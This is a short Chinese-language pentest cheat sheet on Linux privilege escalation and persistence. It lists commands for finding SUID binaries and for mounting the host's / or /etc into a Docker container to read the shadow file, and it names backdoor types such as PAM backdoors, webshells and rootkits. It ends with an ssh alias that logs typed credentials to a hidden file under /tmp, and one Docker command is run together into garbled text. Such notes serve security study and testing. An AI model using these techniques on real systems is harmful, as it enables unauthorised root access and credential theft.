持久化 - Linux
========================================

权限提升
----------------------------------------
- 明文root密码/密码复用
- 脏牛漏洞本地提权
- 内核漏洞利用
    - searchspolit linux
    - searchspolit centos 7 kernel 3.10
- 攻击有root权限的服务
- 通过有SUID属性的可执行文件
    - 查找可能提权的可执行文件
	- ``find / -perm +4000 -ls``
	- ``find / -perm -u=s -type f 2>/dev/null``
	- ``find / -user root -perm -4000 -print 2>/dev/null``
	- ``find / -user root -perm -4000 -exec ls -ldb {} \;``
    - 常用的提权文件：Nmap，Vim，find，Bash，More，Less，Nano，cp
- 利用可用的root权限
    - ``sudo -l``
- crontab计划任务
- docker提权
    - docker images命令查看已经存在的镜像
    - 没有的话就pull一个
	- docker pull alpine
    - 已经存在的images
	- docker run -it --rm xxx /bin/bash    #常规使用
	- docker run -it --rm xxx /bin/sh    #常规使用
	- docker run -it --rm -v /etc:/etc xxx /bin/bash    #异常使用
	- docker run -it --rm -v /etc:/etc xxx /bin/sh    #异常使用
    - 挂载目录到docker镜像内
	- docker run -v /:/mnt  -it alpine
	- docker run -v /etc/:/mnt -it alpinecd /mntcat shadow
    
- 其它
    - ``https://github.com/SecWiki/linux-kernel-exploits``

持久化
----------------------------------------
- 反弹shell
- suid shell
- icmp后门
- sshd wrapper
- sshd软链接后门
- port knocking
- pam后门
- webshell
- rootkit
- strace 后门
    - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
